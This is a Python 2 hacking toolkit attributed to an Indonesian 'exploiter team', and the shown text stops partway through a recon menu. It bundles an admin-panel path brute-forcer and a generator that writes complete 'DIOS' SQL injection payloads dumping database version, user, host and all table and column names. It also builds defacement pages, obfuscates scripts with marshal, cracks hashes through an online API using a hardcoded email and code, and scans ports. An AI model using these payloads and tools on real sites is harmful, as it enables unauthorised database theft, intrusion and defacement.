#!/usr/bin/env python
#-*- coding: utf-8 -*-
#coded by : w0n63d4n & dvf47

#Color
a='\033[1;30m'
r='\033[1;31m'
g='\033[32;1m' 
y='\033[1;33m'
b='\033[1;34m'
p='\033[1;35m' 
c='\033[1;36m' 
w='\033[1;37m' 
W='\033[1;37m' 
n='\033[0;00m' 
br='\033[97;7m'
k='\033[0;00m' 
from datetime import datetime
import json
import html2text 
import subprocess,os,sys,mechanize,requests,urllib
from time import sleep
from socket import *
from hashlib import *
from urllib2 import *
from string import *
from random import *
from os import system
import re
import pkgutil
import platform
import signal
from socket import gethostbyname as wongedan
try:
        import os, sys, readline, rlcompleter
except Exception as F:
        exit("[ModuleErr] %s"%(F))

if sys.version[0] in '3':
        exit("[sorry] use python version 2")


def banner(): 
    print w+"               .----------."
    print w+"              /            \   "+w+"Author "+r+":"+w+" Dfv47 & Mr.W0N63D4N"
    print w+"             /              \  "+r+"Z O N E _ E X P L O I T E R _ T E A M"
    print w+"             |,  .-.  .-.  ,|  "+r+"____             _    _____            _      "
    print w+"             | )("+g+"##"+w+"/  \\"+g+"##"+w+")( | "+r+"|    \  ___  ___ | |_ |_   _| ___  ___ | | ___ "
    print w+"             |/     /\     \| "+w+"|  |  || .'||  _|| '_|  | |  | . || . || ||_ -|"
    print w+"       (@_   <__    ^^    __> "+w+"|____/ |__,||_|  |_,_|  |_|  |___||___||_||___|"
    print w+"  _     ) \___\__|"+g+"IIIIII"+w+"|__/____________________________________"
    print w+" (_)"+g+"0000"+w+"{}<_____________________________________________________"+g+">>"
    print w+"        )_/     \ "+g+"IIIIII"+w+" /"
    print w+"       (@        --------\n"
    print W+' ['+g+'*'+W+'] Info System    : '+y+str(platform.uname())
    print W+' ['+g+'*'+W+'] Your Path      : '+y+os.getcwd()
    #print W+' ['+g+'*'+W+'] list dir     : '+y+str(os.listdir('.'))
    print W+' ['+g+'*'+W+'] Api version    : '+y+str(sys.api_version)
    print W+' ['+g+'*'+W+'] Python version : '+y+str(sys.version_info.major)
    print W+' ['+g+'*'+W+'] Os Name        : '+y+os.name
    print W+' ['+g+'*'+W+'] Implementation : '+y+platform.python_implementation()
    print W+' ['+g+'*'+W+'] Interpreter    : '+y+sys.version

#Email Scraping
def email(host):
    print w+"\n ["+g+"#"+w+"] Email addresses found on page : \n"
    try:
        e = urlopen('http://' + str(host))
    except:
        print "Error"
    try:
        e = urlopen('http://' + str(host))
    except:
        print "Error"
    try:
        cont = html2text.html2text(e.read())
    except UnicodeDecodeError:
        try:
            cont = html2text.html2text(urlopen('http://' + str(host)).read().decode('utf-8'))
        except :
            cont = urlopen('http://' + str(host)).read()
    cont = cont.split('\n')
    for line in cont:
        if '@' in line:
            print line
        else:
            print w+" ["+r+"#"+w+"] Not email in domain !"
            pass
            
#Wordlist Admin Finder
finder = [
 'admin', 'admin.php', 'admin.html', 'admin1.php', 'admin1.html', 'admin2.php', 'admin2.html', 'login', 'login.php', 'login.html', 'yonetim.php', 'yonetim.html', 'yonetici.php', 'yonetici.html', 'ccms/', 'ccms/login.php',
 'ccms/index.php', 'maintenance/', 'webmaster/',
 'adm/', 'configuration/', 'configure/', 'websvn/',
 'admin/', 'admin/account.asp', 'admin/account.html', 'admin/account.php', 'admin/add_banner.php/', 'admin/addblog.php',
 'admin/add_gallery_image.php', 'admin/add.php',
 'admin/add-room.php', 'admin/add-slider.php', 'admin/add_testimonials.php', 'admin/admin/', 'administrator',
 'admin/adminarea.php', 'admin/admin.asp', 'admin/AdminDashboard.php', 'admin/admin-home.php', 'admin/AdminHome.php', 'admin/admin.html', 'admin/admin_index.php', 'admin/admin_login.asp', 'admin/admin-login.asp', 'admin/adminLogin.asp', 'admin/admin_login.html', 'admin/admin-login.html', 'admin/adminLogin.html', 'admin/admin_login.php', 'admin/admin-login.php', 'admin/adminLogin.php', 'admin/admin_management.php', 'admin/admin.php', 'admin/admin_users.php', 'admin/adminview.php', 'admin/adm.php', 'admin_area/', 'adminarea/', 'admin_area/admin.asp', 'adminarea/admin.asp', 'admin_area/admin.html', 'adminarea/admin.html', 'admin_area/admin.php', 'adminarea/admin.php', 'admin_area/index.asp', 'adminarea/index.asp', 'admin_area/index.html', 'adminarea/index.html', 'admin_area/index.php', 'adminarea/index.php', 'admin_area/login.asp', 'adminarea/login.asp', 'admin_area/login.html', 'adminarea/login.html', 'admin_area/login.php', 'adminarea/login.php', 'admin.asp', 'admin/banner.php', 'admin/banners_report.php', 'admin/category.php', 'admin/change_gallery.php', 'admin/checklogin.php', 'admin/configration.php', 'admincontrol.asp', 'admincontrol.html', 'admincontrol/login.asp', 'admincontrol/login.html', 'admincontrol/login.php', 'admin/control_pages/admin_home.php', 'admin/controlpanel.asp', 'admin/controlpanel.html', 'admin/controlpanel.php', 'admincontrol.php', 'admincontrol.php/', 'admin/cpanel.php', 'admin/cp.asp', 'admin/CPhome.php', 'admin/cp.html', 'admincp/index.asp', 'admincp/index.html', 'admincp/login.asp', 'admin/cp.php', 'admin/dashboard/index.php', 'admin/dashboard.php', 'admin/dashbord.php', 'admin/dash.php', 'admin/default.php', 'adm/index.asp', 'adm/index.html', 'adm/index.php', 'admin/enter.php', 'admin/event.php', 'admin/form.php', 'admin/gallery.php', 'admin/headline.php', 'admin/home.asp', 'admin/home.html', 'admin_home.php', 'admin/home.php', 'admin.html', 'admin/index.asp', 'admin/index-digital.php', 'admin/index.html', 'admin/index.php', 'admin/index_ref.php', 'admin/initialadmin.php', 'admin.php', 'admin.html', 'admin/cp.php', 'admin/cp.html', 'cp.php', 'cp.html', 'administrator/', 'administrator/index.html', 'administrator/index.php', 'administrator/login.html', 'administrator/login.php', 'administrator/account.html', 'administrator/account.php', 'administrator.php', 'administrator.html', 'login.php', 'login.html', 'modelsearch/login.php', 'moderator.php', 'moderator.html', 'moderator/login.php', 'moderator/login.html', 'moderator/admin.php', 'moderator/admin.html', 'moderator/', 'account.php', 'account.html', 'controlpanel/', 'controlpanel.php', 'controlpanel.html', 'admincontrol.php', 'admincontrol.html', 'adminpanel.php', 'adminpanel.html', 'admin1.asp', 'admin2.asp', 'yonetim.asp', 'yonetici.asp', 'admin/account.asp', 'admin/index.asp', 'admin/login.asp', 'admin/home.asp', 'admin/controlpanel.asp', 'admin.asp', 'admin/cp.asp', 'cp.asp', 'administrator/index.asp', 'administrator/login.asp', 'administrator/account.asp', 'administrator.asp', 'login.asp', 'modelsearch/login.asp', 'moderator.asp', 'moderator/login.asp', 'moderator/admin.asp', 'account.asp', 'controlpanel.asp', 'admincontrol.asp', 'adminpanel.asp', 'fileadmin/', 'fileadmin.php', 'fileadmin.asp', 'fileadmin.html', 'administration/', 'administration.php', 'administration.html', 'sysadmin.php', 'sysadmin.html', 'phpmyadmin/', 'myadmin/', 'sysadmin.asp', 'sysadmin/', 'ur-admin.asp', 'ur-admin.php', 'ur-admin.html', 'ur-admin/', 'Server.php', 'Server.html', 'Server.asp', 'Server/', 'wp-admin/', 'administr8.php', 'administr8.html', 'administr8/', 'administr8.asp', 'webadmin/', 'webadmin.php', 'webadmin.asp', 'webadmin.html', 'administratie/', 'admins/', 'admins.php', 'admins.asp', 'admins.html', 'administrivia/', 'Database_Administration/', 'WebAdmin/', 'useradmin/', 'sysadmins/', 'admin1/', 'system-administration/', 'administrators/', 'pgadmin/', 'directadmin/', 'staradmin/', 'ServerAdministrator/', 'SysAdmin/', 'administer/', 'LiveUser_Admin/', 'sys-admin/', 'typo3/', 'panel/', 'cpanel/', 'cPanel/', 'cpanel_file/', 'platz_login/', 'rcLogin/', 'blogindex/', 'formslogin/', 'autologin/', 'support_login/', 'meta_login/', 'manuallogin/', 'simpleLogin/', 'loginflat/', 'utility_login/', 'showlogin/', 'memlogin/', 'members/', 'login-redirect/', 'sub-login/', 'wp-login/', 'login1/', 'dir-login/', 'login_db/', 'xlogin/', 'smblogin/', 'customer_login/', 'UserLogin/', 'login-us/', 'acct_login/', 'admin_area/', 'bigadmin/', 'project-admins/', 'phppgadmin/', 'pureadmin/', 'sql-admin/', 'radmind/', 'openvpnadmin/', 'wizmysqladmin/', 'vadmind/', 'ezsqliteadmin/', 'hpwebjetadmin/', 'newsadmin/', 'adminpro/', 'Lotus_Domino_Admin/', 'bbadmin/', 'vmailadmin/', 'Indy_admin/', 'ccp14admin/', 'irc-macadmin/', 'banneradmin/', 'sshadmin/', 'phpldapadmin/', 'macadmin/', 'administratoraccounts/', 'admin4_account/', 'admin4_colon/', 'radmind-1/', 'Super-Admin/', 'AdminTools/', 'cmsadmin/', 'SysAdmin2/', 'globes_admin/', 'cadmins/', 'phpSQLiteAdmin/', 'navSiteAdmin/', 'server_admin_small/', 'logo_sysadmin/', 'server/', 'database_administration/', 'power_user/', 'system_administration/', 'ss_vms_admin_sm/', 'admins', 'mail', 'adm', 'party', 'admin', 'administration', 'administrator', 'administrators', 'database', 'admin.php', 'admin.asp', 'administrator.php', 'administrator.asp', 'administrators.asp', 'administrators.asp', 'login.php', 'login.asp', 'logon.asp', 'logon.php', 'quanly.asp', 'quanly.php', 'quantri.php', 'quantri.asp', 'quantriweb.asp', 'quantriweb.asp', 'admin_index.asp', 'admin_index.php', 'password.asp', 'password.php', 'dangnhap.asp', 'dangnhap.php', 'user.php', 'user.asp', 'phpinfo.', 'logs.', 'log.', 'adminwww', 'db.', 'Readme.', 'urllist.', 'admin_file', 'admin_files', 'admin_login', 'cpg', 'inc_lib', 'inc_conf', 'inc_config', 'lib_config', 'login', 'logon', 'forum', 'forums', 'diendan', 'restricted', 'forum1', 'forum2', 'forum3', 'diendan1', 'diendan2', 'foto', 'diendan3', 'php', 'phpbb', 'awstats', 'test', 'img-sys', 'cgi-sys', 'java-sys', 'php-sys', 'adserver', 'login-sys', 'admin-sys', 'community', 'cgi-sys/mchat.', 'demo', 'download', 'temp', 'tmp', 'ibf', 'ipb', 'vbb', 'vbb1', 'vbb2', 'adminp', 'vbb3', 'README', 'INSTALL', 'install', 'docs', 'document', 'documents', 'DOC', 'CHANGELOG', 'guest', 'phpMyAdmin', 'phpbb1', 'phpbb2', 'phpBB', 'phpBB2', 'PHPBB', 'hackconkec', '12931293', 'secret', 'root', 'cgi-bin', 'files', 'scripts', 'nobody', 'home', 'manager', 'manage', 'live', 'exec', 'livehelp', 'livechat', 'chat', 'phplive', 'php.', 'ko', 'khong', 'khongdungnua', 'kodungnua', 'vut', 'cuc', 'cut', 'db', 'data', 'site', 'cgi', 'taolao', 'class', 'online', 'common', 'shop', 'shopadmin', 'thesun', 'news', 'store', 'text', 'source', 'sources', 'control', 'controls', 'console', 'cp', 'admincp', 'web', 'modules', '_admin', '_admin_file', 'admin_site', '_login', 'pages', 'access', 'password', 'pwd', 'pass', 'user', 'users', '_users', 'admin_user', 'admin_users', 'content', 'cart', 'carts', 'cc', 'paypal', 'cvv', 'cvv2', 'main1', 'main', 'webalizer', 'widgets', 'acc', 'accounts', 'achive', 'nhanvien', 'domain', 'gallerry', 'mysql', 'order', 'orders', '4rum', 'photo', 'phpmyadmin', 'share', 'save', 'help', 'admin_', 'login_', 'webmaster']

#Admin Finder
def admin(host):
		print w+"\n ["+g+"#"+w+"] Result "+g+":"+w+" "
		print ""
		if host.startswith("http://") or host.startswith("https://") is False:
			host = "http://" + host or "https://" + host
		for i in finder:
			target = host + "/" + i
			try:
				yop = Request(target);buka = urlopen(yop);sleep(1.5)
				print w+" ["+g+"   FOUND   "+w+"]"+y+" => " + w + target
				continue
			except URLError,HTTPError:
				print w+" [ "+r+"NOT FOUND "+w+"]"+y+" => " + w + target
				continue
			except KeyboardInterrupt:
				break

#Dios sql creator
def dios_sc():
    w = 'concat(0x'
    z = 'concat(0x'
    gambar = '3c696d67207372633d'
    gambar2 = '77696474683d3330303e'
    w2 = ',0x3c666f6e7420636f6c6f723d72656420666163653d636f7572696572206e65772073697a653d343e'
    br = ',0x3c62723e'
    dios1 = ',0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version/**_**/(),0x3C62723E,0x4461746162617365203A3A20,database/**_**/(),0x3c62723e44617461626173652055736572203a3a20,user/**_**/(),0x3c62723e,0x486F73746E616D65203A3A20,@@hostname,0x3C62723E,0x506F7274203A3A20,@@port,0x3C62723E,0x53796D6C696E6B203A3A20,@@GLOBAL.have_symlink,0x3C62723E,0x546D7020646972203A3A20,@@tmpdir,0x3C62723E,0x4261736520646972203A3A20,@@basedir,0x3C62723E,0x4461746120646972203A3A20,@@datadir,0x3C62723E,0x53534C203A3A20,@@GLOBAL.have_ssl,0x3C62723E,0x55554944203A3A20,UUID(),0x3C62723E,0x4F73203A3A20,@@version_compile_os,0x3c62723e,0x54697065203A3A20,@@version_compile_machine,0x3c62723e,(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(table_schema=database())and(@:=concat(@,0x3c62723e,0x3C666F6E7420636F6C6F723D677265656E2073697A653D333E,table_name,0x3C2F666F6E743E20,0x203A3A20,0x3C666F6E7420636F6C6F723D626C75652073697A653D333E,column_name))),@))))'
    dios2 = ',0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version/**_**/(),0x3C62723E,0x4461746162617365203A3A20,database/**_**/(),0x3c62723e44617461626173652055736572203a3a20,user/**_**/(),export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2))'
    print W+"\n ["+g+"+"+W+"] Dios SQL Injection manual creator"
    print g+"\n  * "+W+"Version : "
    print W+" ["+g+"1"+W+"] Dios by Dfv47 "+g+"("+W+"easy web"+g+")"
    print W+" ["+g+"2"+W+"] Dios by _w0n63d4n_ "+g+"("+W+"easy and medium web"+g+")"
    print W+" ["+g+"3"+W+"] Dios by Zx7 "+g+"("+W+"medium and hard web"+g+")"
    print W+" ["+g+"4"+W+"] Create Dios own "+g+"("+W+"Bikin Sendiri"+g+")"
    sayang = raw_input(W+"\n ["+g+"+"+W+"] Choose : ")
    if sayang == '1':
            print W+"\n ["+g+"+"+W+"] Dios SQL by Dfv47"
            cek  = raw_input(W+' ['+g+'*'+W+'] Url image (dlm hex) : ')
            nama = raw_input(W+' ['+g+'*'+W+'] Your name (dlm hex) : ')
            nf   = raw_input(W+' ['+g+'*'+W+'] Name file dios      : ')
            wongedan = w + gambar + cek + gambar2 + br + ',0x' + nama + dios1
            fil = open(nf, 'w')
            fil.write('#Dios Version By Dfv47')
            fil.write(wongedan)
            fil.close()
            system('mv ' + nf + ' /storage/emulated/0')
            sleep(1.5) 
            print W+"\n ["+g+"#"+W+"] Dios has been created "
            print W+" ["+g+"#"+W+"] Name file     : "+nf+""        
            print W+" ["+g+"#"+W+"] Location file : /storage/emulated/0/"+nf+""    
    elif sayang == '2':
            print W+"\n ["+g+"+"+W+"] Dios SQL by _w0n63d4n_"
            cek  = raw_input(W+' ['+g+'*'+W+'] Url image (dlm hex) : ')
            nama = raw_input(W+' ['+g+'*'+W+'] Your name (dlm hex) : ')
            nf   = raw_input(W+' ['+g+'*'+W+'] Name file dios      : ')
            wongedan = w + gambar + cek + gambar2 + br + ',0x' + nama + dios1
            fil = open(nf, 'w')
            fil.write('#Dios Version By _w0n63d4n_')
            fil.write(wongedan)
            fil.close()
            system('mv ' + nf + ' /storage/emulated/0')
            sleep(1.5) 
            print W+"\n ["+g+"#"+W+"] Dios has been created "
            print W+" ["+g+"#"+W+"] Name file     : "+nf+""        
            print W+" ["+g+"#"+W+"] Location file : /storage/emulated/0/"+nf+""
    elif sayang == '3':
            print W+"\n ["+g+"+"+W+"] Dios SQL by Zx7"
            cek  = raw_input(W+' ['+g+'*'+W+'] Url image (dlm hex) : ')
            nama = raw_input(W+' ['+g+'*'+W+'] Your name (dlm hex) : ')
            nf   = raw_input(W+' ['+g+'*'+W+'] Name file dios      : ')
            zx7 = z + gambar + cek + gambar2 + br + ',0x' + nama + dios2
            fil = open(nf, 'w')
            fil.write('#Dios Version By Zx7')
            fil.write(zx7)
            fil.close()
            system('mv ' + nf + ' /storage/emulated/0')
            sleep(1.5)
            print W+"\n ["+g+"#"+W+"] Dios has been created "
            print W+" ["+g+"#"+W+"] Name file     : "+nf+""        
            print W+" ["+g+"#"+W+"] Location file : /storage/emulated/0/"+nf+""
    elif sayang == '4':
            inputan = raw_input(W+" ["+g+"#"+W+"] Nick Anda >\033[95m ")
            inputan2 = raw_input(W+" ["+g+"#"+W+"] Link Gambar Anda >\033[95m ")
            gambar = '<img width="300px" src="'+inputan2+'">'
            sin = inputan.encode("hex")
            sin2 = gambar.encode("hex")
            eks = sin
            eks2 = sin2
            cetak =  "/*!50000ConCat(0x"+eks+','+'0x3C62723E'+',0x'+eks2+")*/"
            save = open('DIOSKU.txt','w')
            save.write(cetak)
            system('mv ' +'DIOSKU.txt  /storage/emulated/0')
            sleep(1.5)
            print W+"\n ["+g+"#"+W+"] Dios has been created "
            print W+" ["+g+"#"+W+"] Name file     : DIOSKU.txt"
            print W+" ["+g+"#"+W+"] Location file : /storage/emulated/0/DIOSKU.txt"

#Hash encrypt
def hash_cr():
		print W+"\n ["+g+"+"+W+"] Hash text encryption for password"
		print g+"\n  * "+W+"Version : "
		print W+" ["+g+"1"+W+"] md5"+W+"       ["+g+"4"+W+"] SHA256"
		print W+" ["+g+"2"+W+"] SHA1"+W+"      ["+g+"5"+W+"] SHA384"
		print W+" ["+g+"3"+W+"] SHA224"+W+"    ["+g+"6"+W+"] SHA512"
		susu = raw_input(W+"\n ["+g+"+"+W+"] Choose : ")
		if susu == '1' or susu == 'satu':
				ceck = raw_input(W+"\n ["+g+"#"+W+"] Name hash : md5"+W+"\n ["+g+"#"+W+"] Your text : ");
				hasin = md5();
				hasil = hasin.update(ceck);
				hajar = hasin.hexdigest();
				joni = W+" ["+g+"#"+W+"] Results   : "+hajar;
				sleep(0.5);
				print joni;
		elif susu == '2' or susu == 'dua':
				ceck = raw_input(W+"\n ["+g+"#"+W+"] Name hash : SHA1"+W+"\n ["+g+"#"+W+"] Your text : ");
				hasin = sha1();hasil = hasin.update(ceck)
				hajar = hasin.hexdigest()
				joni = W+" ["+g+"#"+W+"] Results   : "+hajar;
				print joni
				sleep(0.5)
		elif susu == '3' or susu == 'tiga':
				ceck = raw_input(W+"\n ["+g+"#"+W+"] Name hash : SHA224"+W+"\n ["+g+"#"+W+"] Your text : ");
				hasin = sha224()
				hasil = hasin.update(ceck)
				hajar = hasin.hexdigest()
				joni = W+" ["+g+"#"+W+"] Results   : "+hajar;
				print joni
				sleep(0.5)
		elif susu == '4' or susu == 'empat':
				ceck = raw_input(W+"\n ["+g+"#"+W+"] Name hash : SHA256"+W+"\n ["+g+"#"+W+"] Your text : ");
				hasin = sha256();hasil = hasin.update(ceck)
				hajar = hasin.hexdigest()
				joni = W+" ["+g+"#"+W+"] Results   : "+hajar;
				print joni
				sleep(0.5)
		elif susu == '5' or susu == 'lima':
				ceck = raw_input(W+"\n ["+g+"#"+W+"] Name hash : SHA384"+W+"\n ["+g+"#"+W+"] Your text : ");
				hasin = sha384()
				hasil = hasin.update(ceck)
				hajar = hasin.hexdigest()
				joni = W+" ["+g+"#"+W+"] Results   : "+hajar;
				print joni
				sleep(0.5)
		elif susu == '6' or susu == 'enam':
				ceck = raw_input(W+"\n ["+g+"#"+W+"] Name hash : SHA512"+W+"\n ["+g+"#"+W+"] Your text : ");
				hasin = sha512()
				hasil = hasin.update(ceck)
				hajar = hasin.hexdigest()
				joni = W+" ["+g+"#"+W+"] Results   : "+hajar;
				print joni
				sleep(0.5)
				
#Hash dencrypt
def hash_dnc():
    print w+"\n ["+g+"+"+w+"] Hash text dencryption for password"
    type=raw_input(w+"\n ["+g+"#"+w+"] Hash type   : ").lower()
    hash=raw_input(w+" ["+g+"#"+w+"] Input hash  : ")
    email='nnb85353@zwoho.com'
    code='9c512744205f079c'    
    req=requests.get('https://md5decrypt.net/Api/api.php?hash='+hash+'&hash_type='+type+'&email='+email+'&code='+code)
    out=(req.text)
    print w+" ["+g+"#"+w+"] Results     :",out
    if 'CODE ERREUR : 001' in str(out):
    	print w+"\n ["+g+"*"+w+"] Decrpyt hash sudah mencapai limit harian"
    elif 'CODE ERREUR : 002' in str(out):
    	print w+"\n ["+g+"*"+w+"] Ada kesalahan di alamat email/code, mohon hubungi saya"
    elif 'CODE ERREUR : 003' in str(out):
    	print w+"\n ["+g+"*"+w+"] Panjang hash melebihi 400 karakter"
    elif 'CODE ERREUR : 004' in str(out):
    	print w+"\n ["+g+"*"+w+"] Server tidak memilik database type hash "
    elif 'CODE ERREUR : 005' in str(out):
    	print w+"\n ["+g+"*"+w+"] Hash type tidak cocok dengan type hash yang ada"
    elif 'CODE ERREUR : 006' in str(out):
    	print w+"\n ["+g+"*"+w+"] Input hash tidak boleh kosong, silahkan periksa kembali"
    	
#Http Headers
def http(host):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        print "Error"
    host = socket.gethostbyname(host)
    port = raw_input(w+" ["+g+"?"+w+"] Enter the port of the service "+g+":"+w+" ")
    try:
        s.connect((host,int(port)))
        print w+" ["+g+"#"+w+"] Waiting for the connecting...\n";sleep(2)
        if int(port) == 80:
            s.send('HEAD / HTTP/1.0\r\n\r\n')
        data = s.recv(1024);print "\headers:\n" + str(data);s.close()
    except:
        print w+" ["+r+"!"+w+"] Connection failed !!!\n"

#Port scanning
def scanner(host):
		port1 = input(w+" ["+g+"*"+w+"] Scan port from     "+g+":"+w+" ")
		port2 = input(w+" ["+g+"*"+w+"] Scan port to       "+g+":"+w+" ")
		targetIP = socket.gethostbyname(host)
		print w+"\n ["+g+"+"+w+"] Ready to scan "+r+""+host+" "+g+": "+r+""+targetIP+""
		sleep(2) 
		print w+" ["+g+"+"+w+"] Please wait proccess scanning "+r+"%s\n" % (host);sleep(4)
		#wongedan
		for i in range(port1,port2):
			#kentir
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.05);result = s.connect_ex((targetIP, i))
			if(result == 0):
				print (g+"  > "+w+"Port "+g+"["+w+" %d \033[1;32m] \033[1;34m~> \033[1;33mOPEN" % (i))
			else:
				print (g+"  > "+w+"Port "+g+"["+w+" %d \033[1;32m] \033[1;34m~> \033[1;31mCLOSED" % (i))
			s.close()
		time.sleep(2)
		print w+"\n ["+g+"#"+w+"] Scanning finished"

#Information URL hack
def spider(host):
    print g+"\n  *"+w+" Use result to find promising URLs to try hacking using SQL injection or Xss etc"
    print g+"  *"+w+" Depth level = Choose 10-20 is enough usually but depends on you "
    print g+"  *"+w+" Output will also be saved in text files in the same folder as this tools."
    depth = raw_input(w+"\n ["+g+"?"+w+"] Enter the depth level in numbers"+g+" :"+w+" ")
    print ""
    count = 1;url = "http://"+host
    text = open("depth1.txt","w+")
    for i in re.findall('''href=["'](.[^"']+)["']''', urlopen(url).read(), re.I):
        if "http" not in i:
		    i = "http://" + host + i
        print i
        text.write(i + '\n')
    text.close()
    while(count <= int(depth)):
        text = open("depth" + str(count) + ".txt", "r");text1 = open("depth" + str(count + 1) + ".txt", "w+")
        if text.read() == "":
            print "\n****Finished****"
            main()
        f = text.read().split("\n")
        for j in f:
            if "http" not in j:
                j = "http://" + host + j

            for k in re.findall('''href=["'](.[^"']+)["']''', urlopen(j).read(), re.I):
                print k
                text1.write(k + "\n")
        text.close();text1.close()		
        count += 1
    print ""
       
#Script deface creator
def sc_deface():
        print w+"\n ["+g+"+"+w+"] Script deface creator"
        judul  = raw_input('\n ['+g+'*'+w+'] Title judul  : ')
        text   = raw_input(' ['+g+'*'+w+'] Hacked by    : ')
        gambar = raw_input(' ['+g+'*'+w+'] Link image   : ')
        print g+"  * "+w+"Use <br> for enter and change line"
        text2  = raw_input(' ['+g+'*'+w+'] Your message : ')
        tank   = raw_input(' ['+g+'*'+w+'] Thanks To    : ')
        edan  = raw_input(' ['+g+'*'+w+'] Name file    : ')
        wongedan = open(edan, 'w')
        mr1 = '\n\t\t<html>\n\t\t<head>\n\t\t<title>'
        mr2 = judul
        mr3 = '\n\t\t</title>\n\t\t<style>\n\t\t#bg\n\t\t{\n\t\t\tbackground: black;\n\t\t}\n\t\t</style>\n\t\t</head>\n\t\t<body>\n\t\t<body bgcolor id="bg">\n\t\t<center>\n\t\t<font color="lime" size="10" face="courier new">'
        mr4 = text
        mr5 = '</font>\n\t\t<br><br>\n\t\t<link type="text/css" href="http://anicrack-indo.netii.net/error.css" rel="stylesheet">\n\t\t<div class="error">\n\t\t<img style="width: 200px" src="'
        mr6 = gambar
        mr7 = '">\n\t\t</div>\n\t\t<br>\n\t\t<font color="lime" size="5" face="courier new">'
        mr8 = text2
        mr9 = '</font>\n\t\t<br>\n\t\t<br>\n\t\t<footer>\n\t\t<table style="border:1px;border-color:blue;border-style:double;padding-left:2px;padding-right:2px;bottom:2px;height:25px;width:100%;">\n\t\t<tr>\n\t\t<td style="border: 1px;width:10%; background: transparent;box-shadow: 0px 0px 8px green;\n\t\tbottom: 2px; border-color:green; border-style: dotted";>\n\t\t<center>\n\t\t<font style="color:skyblue;direction:center;font-family:electrolize;font-size:20px;text-shadow:0px 0px 5px Sms;">thanks to All:</font></center>\n\t\t</td>\n\t\t<td><marquee class="z"style="color:skyblue; font-size:20px;font-family:electrolize;text-shadow: 0px 0px 5px aqua; direction:left;"scrollamount="5px">'
        mr10 = tank + '</marquee>'
        mr11 = '</td></tr>\n\t\t</table>\n\t\t</footer>\n\t\t</center>\n\t\t</body>\n\t\t</html>'
        wongedan.write(mr1)
        wongedan.write(mr2)
        wongedan.write(mr3)
        wongedan.write(mr4)
        wongedan.write(mr5)
        wongedan.write(mr6)
        wongedan.write(mr7)
        wongedan.write(mr8)
        wongedan.write(mr9)
        wongedan.write(mr10)
        wongedan.write(mr11)
        wongedan.close()
        system('mv ' + edan + ' /storage/emulated/0')
        print w+"\n ["+g+"+"+w+"] Loading please wait to create script..."        
        sleep(3)
        print w+"\n ["+g+"#"+w+"] Script deface has been created "
        print w+" ["+g+"#"+w+"] Name file     : "+edan+""        
        print w+" ["+g+"#"+w+"] Location file : /storage/emulated/0"+edan+""
        
#Marshal Encrypter
def py_mar():
		yopie = raw_input(W+"\n ["+g+"+"+W+"] Marshal encrpt python script"+g+"\n  * "+W+"Example : /storage/emulated/0/darktools.py\n ["+g+"+"+W+"] Name and location your script :") 
		if yopie == yopie:
			save = raw_input(" ["+g+"+"+W+"] Save file with name : ")
			if save == save:
				file = (open(yopie).read())
				itil = (compile(file,'','exec'))
				jembut = dumps(itil)
				wongedan = (open(save, 'w'))
				wongedan.write('#compile marshall by Mr.w0n63d4n\n')
				wongedan.write('from marshal import *\n')
				wongedan.write('exec(loads('+repr(jembut)+'))')
				wongedan.close()
				system('mv ' + save + ' /storage/emulated/0')
				sleep(3)
				print W+"\n ["+g+"#"+W+"] Compile marshal finishing "
				print W+" ["+g+"#"+W+"] Name file     : "+save+""        
				print W+" ["+g+"#"+W+"] Location file : /storage/emulated/0"+save+""

#Infoga
def infoga(): 
    print W+"\n ["+g+"+"+W+"] Information Gathering of website"
    print g+"  * "+W+"Use api : http://hackertarget.com\n"
    print W+" ["+g+"01"+W+"] Dns lookup"+W+"          ["+g+"06"+W+"] Port scanner"
    print W+" ["+g+"02"+W+"] Extract link"+W+"        ["+g+"07"+W+"] Reverse IP Lookup"
    print W+" ["+g+"03"+W+"] GeoIP lookup"+W+"        ["+g+"08"+W+"] Subnet lookup"
    print W+" ["+g+"04"+W+"] Host finder"+W+"         ["+g+"09"+W+"] Whois lookup"
    print W+" ["+g+"05"+W+"] Mtr Traceroute"+W+"      ["+g+"10"+W+"] Zone transfer"
    daffa = raw_input(W+"\n ["+g+"+"+W+"] Choose : ")
    if daffa == '1' or daffa == '01':
       print W+"\n ["+g+"#"+W+"] Dns lookup of website"
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/dnslookup/?q=' + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '2' or daffa == '02':
       print W+"\n ["+g+"#"+W+"] Extract link of website"
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/pagelinks/?q=' + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '3' or daffa == '03':
       print W+"\n ["+g+"#"+W+"] GeoIp lookup of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/geoip/?q=' + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""       
    elif daffa == '4' or daffa == '04':
       print W+"\n ["+g+"#"+W+"] Host finder of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = "http://api.hackertarget.com/hostsearch/?q=" + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '5' or daffa == '05':
       print W+"\n ["+g+"#"+W+"] Mtr Traceroute of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/mtr/?q=' + trans
       yopie = urlopen(api).read()
       print W+" ["+g+"#"+W+"] Result   : \n"+yopie+""
    elif daffa == '6' or daffa == '06':
       print W+"\n ["+g+"#"+W+"] Port scanner of website"       
       zx = raw_input(W+" ["+g+"#"+W+"] Website  : ")
       trans = wongedan(zx)
       api = 'http://api.hackertarget.com/nmap/?q=' + trans
